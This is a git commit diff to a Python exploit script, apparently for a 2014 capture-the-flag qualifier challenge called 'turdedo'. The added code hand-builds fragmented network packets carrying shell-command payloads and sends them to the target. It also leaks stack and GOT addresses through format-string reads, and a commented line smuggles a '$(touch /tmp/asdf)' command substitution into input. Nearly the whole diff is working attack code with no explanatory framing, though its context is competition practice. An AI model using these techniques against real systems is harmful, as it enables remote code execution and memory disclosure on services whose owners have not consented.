ca46952040506f32bb66cdcaa60522304fdf0614
Yan <yans@yancomm.net>
2014-05-18 14:12:16 -0700

    boom

--- examples/quals_2014_turdedo/boom.py
+++ examples/quals_2014_turdedo/boom.py
@@ -102,6 +102,84 @@ class Poop(p.Manipulator):
             f = f[:f.index('\0')]
         return f
 
+    def pn(self, fmt):
+        rdata_1 = "echo   %".ljust(100, "\x00")
+        data = "n\x00" 
+        data += struct.pack(">H", DPORT) 
+        data += struct.pack(">H", len(rdata_1) + 8)
+        data += "DD" 
+        data += rdata_1
+        data2 = "A" * 48
+        hdr = "AAAA"
+        hdr += struct.pack(">H", len(data) + 8)                                         # data len
+        hdr += chr(44)                                                                  # protocol
+        hdr = hdr.ljust(24, "L")
+        hdr += "\x20\x01\x00\x00"
+        hdr += ipaddr                                                                   # ip
+        hdr += "\x00\x00\xf2\x27"
+        hdr += nipaddr                                                                  # ~ip
+        hdr += chr(17)
+        hdr = hdr.ljust(42, "L")
+        hdr += struct.pack(">H", 0x1)
+        hdr += struct.pack(">H", len(data2) + 8)
+        hdr = hdr.ljust(48, "L")
+
+        buf = hdr + data
+
+        sockfd.sendall(buf)
+
+        rdata = "FUCK"
+        data = "n\x00" 
+        data += struct.pack(">H", DPORT) 
+        data += struct.pack(">H", len(rdata) + 8 + 8 + 88)
+        data += "DD" 
+        data += rdata
+        data2 = "A" * 48
+        hdr = "AAAA"
+        hdr += struct.pack(">H", len(data) + 8)                                         # data len
+        hdr += chr(44)                                                                  # protocol
+        hdr = hdr.ljust(24, "L")
+        hdr += "\x20\x01\x00\x00"
+        hdr += ipaddr                                                                   # ip
+        hdr += "\x00\x00\xf2\x27"
+        hdr += nipaddr                                                                  # ~ip
+        hdr += chr(17)
+        hdr = hdr.ljust(42, "L")
+        hdr += struct.pack(">H", 0x11)
+        hdr += struct.pack(">H", len(data2) + 8)
+        hdr = hdr.ljust(48, "L")
+
+        buf = hdr + data
+
+        sockfd.sendall(buf)
+
+        rdata = ""
+        data = "n\x00" 
+        data += struct.pack(">H", DPORT) 
+        data += struct.pack(">H", len(rdata) + 8 + 8 + 4 + 88)
+        data += "DD" 
+        data += rdata
+        data2 = "A" * 48
+        hdr = "AAAA"
+        hdr += struct.pack(">H", len(data) + 8)                                         # data len
+        hdr += chr(44)                                                                  # protocol
+        hdr = hdr.ljust(24, "L")
+        hdr += "\x20\x01\x00\x00"
+        hdr += ipaddr                                                                   # ip
+        hdr += "\x00\x00\xf2\x27"
+        hdr += nipaddr                                                                  # ~ip
+        hdr += chr(17)
+        hdr = hdr.ljust(42, "L")
+        hdr += struct.pack(">H", 0x40)
+        hdr += struct.pack(">H", len(data2) + 8)
+        hdr = hdr.ljust(48, "L")
+
+        buf = hdr + data
+
+        sockfd.sendall(buf)
+
+        print sockfd.recv(1024)
+
     @p.printf(max_length=150, byte_offset=61)
     def format(self, fmt):
         r = self.hit_it_snipped("echo " + fmt)
@@ -114,12 +192,23 @@ def main(host, port):
     b = Poop(host, int(port))
     #print repr(b.dump_stack(1000, offset=18100*4))
     #s = b.dump_stack(1000)
-    s = b.do_memory_read(0x0804DFF4, 0x0804E0D8-0x0804DFF4)
-    got_addrs = struct.unpack("<%dI" % (len(s)/4), s)
-    print [ hex(g) for g in got_addrs ]
-    max_libc = max([ g for g in got_addrs if g > 0x09000000 ])
+
+    #s = b.do_memory_read(0x0804DFF4, 0x0804E0D8-0x0804DFF4)
+    #got_addrs = struct.unpack("<%dI" % (len(s)/4), s)
+    #print [ hex(g) for g in got_addrs ]
+    #max_libc = max([ g for g in got_addrs if g > 0x09000000 ])
     #b.dump_elf(max_libc, filename='libc')
 
+    #for i in range(1, 100):
+    #   print i, repr(b.format("%%%d$08x" % i))
+    print hex(struct.unpack(">I", b.format("%%%d$08x" % 9).decode('hex'))[0] - 60)
+
+
+    #b.format("echo $(touch /tmp/asdf) TEST%10$08xTEST")
+    #b.format("echo $(touch /tmp/asdf) TEST%10$08xTEST")
+    #b.format("ONE")
+    #b.format("TWO")
+    #b.format("THREE")
 
 
     #main_ret_addr = b.main_return_address(0x1279C/4)
@@ -130,8 +219,6 @@ def main(host, port):
     #print "GOT:", repr(b.do_printf("AAAA%4$08xBBBB"))
     #print "GOT:", repr(b.do_printf("AAAA%5$08xBBBB"))
     #print len(b.dump_stack(1000))
-    #for i in range(1, 100):
-    #   print i, repr(b.format("   AAAABBBBCCCC%%%d$08xDDDDEEEEFFFF" % i))
     #print repr(b.hit_it_snipped("echo ok"))
     #for i in range(1, 1000):
     #   print i
